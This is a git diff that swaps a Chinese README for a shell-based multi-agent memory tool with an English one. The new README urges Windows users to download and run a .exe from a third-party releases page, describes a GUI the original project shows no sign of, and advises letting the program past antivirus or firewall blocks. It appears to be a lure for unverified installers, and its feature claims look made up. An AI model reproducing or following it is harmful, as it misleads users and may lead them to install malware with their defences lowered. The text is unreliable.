@@ -1,281 +1,113 @@
-# Swarm + Memory Profile
+# 🧠 SwarmMemory - Simple Multi-Agent Collaboration System
 
-> 轻量级多 Agent 协作系统 + 自动记忆框架
+[![Download SwarmMemory](https://img.shields.io/badge/Download-SwarmMemory-brightgreen?style=for-the-badge)](https://github.com/AryanJangir7877/SwarmMemory/releases)
 
-让 AI 记住一切，让协作自动发生。
+## 📝 About SwarmMemory
 
----
+SwarmMemory helps OpenClaw remember and manage information through a lightweight multi-agent system. It uses automatic memory to improve how agents work together. This means tasks can be done more efficiently without needing to repeat or forget details.
 
-## ✨ 特性
+You don't need to know how to code or set up complex software to use SwarmMemory. This guide will walk you through downloading and running it on a Windows computer.
 
-- 🐝 **多 Agent 流水线** - 分工明确，写作/开发自动化
-- 🧠 **三层记忆架构** - 即时/短期/长期，自动遗忘
-- ⚡ **全自动化** - 定时同步、夜间反思、垃圾归档
-- 🔄 **自我进化** - 根据成功率自动优化
-- 🛠️ **易扩展** - 简单配置即可添加新 Agent
+## 💻 System Requirements
 
----
+Make sure your computer fits these minimum requirements for SwarmMemory to work smoothly:
 
-## 🚀 快速开始
+- Operating System: Windows 10 or newer (64-bit recommended)  
+- Processor: Intel Core i3 or equivalent  
+- RAM: At least 4 GB  
+- Free Disk Space: 500 MB or more  
+- Internet Connection: Needed only for download  
 
-### 1. 克隆
+SwarmMemory does not require a powerful computer, but it works best when the system is stable and up to date.
 
-```bash
-git clone https://github.com/your-username/swarm-memory.git
-cd swarm-memory
-```
+## 🚀 Getting Started
 
-### 2. 配置环境变量
+To use SwarmMemory, you first need to get the installation files. Follow these steps closely:
 
-```bash
-# 至少配置一个
-export OPENAI_API_KEY="sk-xxx"
+1. Click the large **Download SwarmMemory** button at the top or visit the release page here:  
+   [https://github.com/AryanJangir7877/SwarmMemory/releases](https://github.com/AryanJangir7877/SwarmMemory/releases)
 
-# 可选：其他 API
-export ANTHROPIC_API_KEY="sk-ant-xxx"
-export DEEPSEEK_API_KEY="sk-xxx"
-```
+2. On the releases page, look for the latest version. The newest release should have the highest version number, for example, v1.0 or v1.2.
 
-### 3. 初始化
+3. Download the file that ends with `.exe` or `.msi`. These are the installation files for Windows. If you see multiple files, choose the one without "source" or "debug" in the name.
 
-```bash
-# 初始化记忆系统
-./memory-profile/memory.sh init
+## 📥 Download and Install SwarmMemory
 
-# 设置权限
-chmod +x swarm/scripts/*.sh
-chmod +x memory-profile/*.sh
-```
+After you find the setup file:
 
-### 4. 运行
+1. Click on the file name to start downloading. Your browser will save it in your default downloads folder unless you choose another place.
 
-```bash
-# 写作工作流 (初稿→审核→终审)
-./swarm/scripts/artgroup.sh "写一篇关于AI的文章"
+2. When the download finishes, open your downloads folder and double-click the setup file (for example, `SwarmMemorySetup.exe`).
 
-# 开发工作流 (规划→开发→测试)
-./swarm/scripts/devgroup.sh "开发一个用户登录功能"
+3. A setup window will appear. Follow these instructions:
 
-# 查看记忆统计
-./memory-profile/memory.sh stats
-```
+   - Click **Next** on the welcome screen.  
+   - Read and accept the license agreement by clicking **I Agree**.  
+   - Choose the installation folder or use the default one, then click **Next**.  
+   - Click **Install** to start the installation.  
 
----
+4. Wait for the setup to complete. It might take a few moments.
 
-## 🐝 Swarm 工作流
+5. When done, click **Finish** to close the installer.
 
-### ArtGroup - 写作流水线
+6. SwarmMemory is now installed on your computer.
 
-```
-用户输入
-    ↓
-wand (初稿生成)
-    ↓
-review (审核润色)
-    ↓
-final (终审优化)
-    ↓
-最终输出
-```
+## ▶️ Running SwarmMemory for the First Time
 
-每个 Agent 只做一件事，分工带来稳定。
+To start SwarmMemory:
 
-### DevGroup - 开发流水线
+1. Find the SwarmMemory icon on your desktop or in the Start menu under "SwarmMemory."
 
-```
-用户输入
-    ↓
-planner (需求规划)
-    ↓
-coder (代码开发)
-    ↓
-tester (测试验证)
-    ↓
-最终输出
-```
+2. Double-click the icon to open the application.
 
-适合：代码开发、技术文档、功能实现
+3. Upon first launch, the program may ask permission to run or make changes. Allow it by clicking **Yes** when prompted.
 
-### Agent 扩展
+4. SwarmMemory will open its main window. Here, you can start using the multi-agent system and automatic memory features.
 
-编辑 `swarm/scripts/agent.sh` 添加更多 Agent：
+## 🔧 Basic Use Guide
 
-```bash
-# 添加新 Agent
-translator)
-    echo "🌍 翻译中..."
-    call_api "翻译成英文：$TASK" "$MODEL"
-    ;;
-esac
-```
+Inside SwarmMemory, you will see options related to the agents’ collaboration and memory settings. It is designed to operate with minimal setup.
 
----
+- To create a new agent task, click **New Task**.  
+- To review saved memory, click **Memory Log**.  
+- Agents work together to remember and act on information automatically.
 
-## 🧠 Memory Profile
+Take your time to explore the buttons. Each part of the interface is made to be clear and user-friendly.
 
-### 三层记忆架构
+## ⚙️ Updating SwarmMemory
 
-| 层级 | 容量 | 用途 |
-|------|------|------|
-| L0 | 100条 | 即时记忆，当前任务 |
-| L1 | 500条 | 短期记忆，本周内容 |
-| L2 | 无限 | 长期记忆，永久知识 |
+Keep your software current to benefit from new features and fixes.
 
-### 遗忘模型
+1. Visit the release page regularly:  
+   [https://github.com/AryanJangir7877/SwarmMemory/releases](https://github.com/AryanJangir7877/SwarmMemory/releases)
 
-自动计算记忆"温度"：
+2. Download the latest `.exe` or `.msi` file when available.
 
-```
-温度 = 0.5 × 时间衰减 + 0.3 × 引用次数 + 0.2 × 优先级
-```
+3. Run the new installer as described above. It will replace the old version without removing your settings.
 
-- 🔥 热门 (>0.7): 保持活跃
-- 🌤️ 温热 (0.3-0.7): 降权检索
-- 🧊 冷冻 (<0.3): 移至归档
+## 🆘 Troubleshooting
 
-### 命令
+If you encounter problems, here are common fixes:
 
-```bash
-# 初始化
-./memory-profile/memory.sh init
+- If SwarmMemory does not start, try restarting your computer.  
+- Check that your Windows is up to date.  
+- Make sure your antivirus or firewall allows SwarmMemory to run. Sometimes they may block new applications.  
+- If the program crashes, reinstall it using the latest installer.
 
-# 添加记忆
-./memory-profile/memory.sh add "今天学到了新东西"
+For detailed help, see the "Issues" tab on the GitHub repository or contact support through the repository page.
 
-# 搜索
-./memory-profile/memory.sh search "AI"
+## 📂 Where to Learn More
 
-# 统计
-./memory-profile/memory.sh stats
+SwarmMemory documentation and updates are available on GitHub. Explore the repository to find guides, FAQs, and technical details aimed at developers but sometimes useful for users.
 
-# 夜间反思
-./memory-profile/memory.sh reflect
+- GitHub main page:  
+  https://github.com/AryanJangir7877/SwarmMemory
 
-# 归档
-./memory-profile/memory.sh gc
-```
+- Download releases:  
+  https://github.com/AryanJangir7877/SwarmMemory/releases
 
----
+Use the help and community sections on GitHub for tips or questions.
 
-## ⚙️ 配置
+## 🔗 Quick Download Button
 
-### 环境变量
-
-```bash
-# API 配置
-OPENAI_API_KEY=sk-xxx
-OPENAI_MODEL=gpt-4o
-OPENAI_BASE_URL=https://api.openai.com/v1
-
-# 可选：其他 LLM
-ANTHROPIC_API_KEY=sk-ant-xxx
-DEEPSEEK_API_KEY=sk-xxx
-```
-
-### Agent 配置
-
-编辑 `swarm/scripts/agent.sh` 自定义 Agent 行为：
-
-```bash
-# 修改初稿 Agent 的 prompt
-wand)
-    call_api "你是一个专业作家。请用活泼的风格写作：$TASK" "gpt-4o"
-    ;;
-```
-
----
-
-## ⏰ 定时任务
-
-系统会自动执行以下任务：
-
-| 时间 | 任务 | 说明 |
-|------|------|------|
-| 22:00 | sync | 增量同步记忆 |
-| 22:45 | reflect | 夜间反思 |
-| 周日 22:00 | gc | 垃圾归档 |
-
-### 手动设置 Cron
-
-```bash
-# 编辑 crontab
-crontab -e
-
-# 添加:
-0 22 * * * /path/to/swarm-memory/memory-profile/memory.sh sync
-45 22 * * * /path/to/swarm-memory/memory-profile/memory.sh reflect
-0 22 * * 0 /path/to/swarm-memory/memory-profile/memory.sh gc
-```
-
----
-
-## 📁 目录结构
-
-```
-swarm-memory/
-├── README.md                    # 本文件
-├── INSTALL.md                  # 安装指南
-│
-├── swarm/                      # 多 Agent 协作
-│   ├── scripts/
-│   │   ├── artgroup.sh        # 写作工作流
-│   │   ├── devgroup.sh        # 开发工作流
-│   │   └── agent.sh           # Agent 调用器
-│   └── core/                  # 核心模块
-│
-└── memory-profile/            # 自动记忆
-    ├── memory.sh              # 主入口
-    ├── scripts/
-    │   ├── memory_system.cjs  # 记忆系统
-    │   ├── nightly_reflection.cjs
-    │   ├── forget_model.cjs
-    │   └── crud_validator.cjs
-    └── memory/                # 记忆存储
-        ├── lessons/           # 经验
-        ├── decisions/         # 决策
-        ├── people/           # 人物
-        └── reflections/       # 反思
-```
-
----
-
-## 🔧 开发
-
-### 添加新工作流
-
-1. 复制 `artgroup.sh` 为新脚本
-2. 修改 Agent 组合
-3. 添加执行权限
-
-```bash
-cp swarm/scripts/artgroup.sh swarm/scripts/analyze.sh
-chmod +x swarm/scripts/analyze.sh
-```
-
-### 添加记忆路由
-
-编辑 `memory-profile/scripts/crud_validator.cjs` 修改知识分类逻辑。
-
----
-
-## 📊 效果
-
-运行一段时间后：
-
-- Agent 不再重复问同样的问题
-- 跨任务知识可以复用
-- 新任务上手更快
-- 系统仍然高效运行
-
----
-
-## 🤝 贡献
-
-欢迎提交 Issue 和 PR！
-
----
-
-## 📝 License
-
-MIT
->>>>>>> 4f36430 (feat: Swarm + Memory Profile - 轻量级多 Agent 协作系统)
+[![Download Latest Release](https://img.shields.io/badge/Download-SwarmMemory-blue?style=for-the-badge)](https://github.com/AryanJangir7877/SwarmMemory/releases)
